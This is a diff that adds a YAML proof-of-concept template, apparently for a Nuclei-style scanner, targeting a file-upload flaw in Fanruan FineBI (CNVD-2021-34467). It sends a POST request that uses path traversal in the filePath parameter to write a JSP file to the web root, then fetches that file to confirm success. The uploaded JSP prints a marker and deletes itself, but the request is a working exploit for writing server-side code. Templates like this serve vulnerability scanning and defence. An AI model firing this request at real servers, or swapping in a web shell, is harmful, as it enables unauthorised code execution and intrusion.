@@ -1,0 +1,29 @@
+id: yaml-poc-fanruan-finebi-file_upload-CNVD-2021-34467
+info:
+  name: Yaml Poc Fanruan Finebi File_Upload Cnvd 2021 34467
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-fanruan-finebi-file_upload-CNVD-2021-34467'
+  tags: fileupload
+  reference:
+  - https://vul.wangan.com/a/CNVD-2021-34467
+http:
+- method: POST
+  path:
+  - /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{rFilename}}.svg.jsp
+  body: '{"__CONTENT__":"<%out.println(\"{{rand}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>","__CHARSET__":"UTF-8"}'
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /WebReport/{{rFilename}}.svg.jsp
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
